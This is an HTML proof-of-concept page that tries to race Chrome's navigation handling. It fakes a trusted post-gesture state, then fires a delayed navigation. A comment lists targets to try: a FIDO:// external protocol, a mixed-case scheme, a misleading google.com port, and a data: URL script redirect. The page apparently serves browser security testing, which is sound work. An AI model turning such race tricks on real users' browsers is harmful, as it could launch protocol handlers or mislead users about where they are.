<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Chrome Navigation Race + Scheme Handling PoC</title>

<style>
body {
  font-family: system-ui, sans-serif;
}
#panel {
  display: none;
  padding: 16px;
  margin-top: 20px;
  border: 2px solid #e00;
  background: #fee;
}
button {
  padding: 10px 14px;
  font-size: 15px;
}
pre {
  background: #111;
  color: #0f0;
  padding: 10px;
  margin-top: 20px;
  height: 200px;
  overflow: auto;
}
</style>
</head>

<body>

<h2>Chrome Desktop – Navigation Race Condition PoC</h2>

<p>
This PoC attempts to trigger a navigation race shortly after a trusted UI
state transition, to test whether Chrome consistently blocks restricted
or sensitive navigations.
</p>

<button id="trigger">Start flow</button>

<div id="panel">
  <strong>Trusted UI Panel</strong><br>
  Simulating a post‑gesture / trusted context.
</div>

<pre id="log"></pre>

<script>
const trigger = document.getElementById('trigger');
const panel = document.getElementById('panel');
const logEl = document.getElementById('log');

function log(msg) {
  logEl.textContent += msg + "\n";
}

/*
 * Step 1:
 * Simulate transition into a trusted / post‑gesture state
 */
trigger.onclick = () => {
  log("[+] User gesture received");
  history.pushState({}, '', '/trusted');
  panel.style.display = 'block';
};

/*
 * Step 2:
 * Trigger a navigation race shortly after permission‑like flow starts
 *
 * pageshow + double rAF ensures execution right after BFCache /
 * navigation lifecycle stabilization.
 */
window.addEventListener('pageshow', () => {
  log("[*] pageshow event");

  requestAnimationFrame(() => {
    requestAnimationFrame(() => {
      log("[*] Inside double rAF");

      setTimeout(() => {
        log("[!] Triggering delayed navigation");

        /*
         * CHANGE TARGETS TO TEST:
         *
         * 1. External protocol attempt
         *    location.href = 'FIDO://';
         *
         * 2. Mixed‑case scheme
         *    location.href = 'FiDo://';
         *
         * 3. Confusing but invalid authority
         *    location.href = 'https://google.com:9090';
         *
         * 4. Redirect chain
         *    location.href = 'data:text/html,<script>location.href=\"FIDO://\"<\/script>';
         */

        location.href = 'https://google.com:9090';

      }, 80);
    });
  });
});
</script>

</body>
</html>
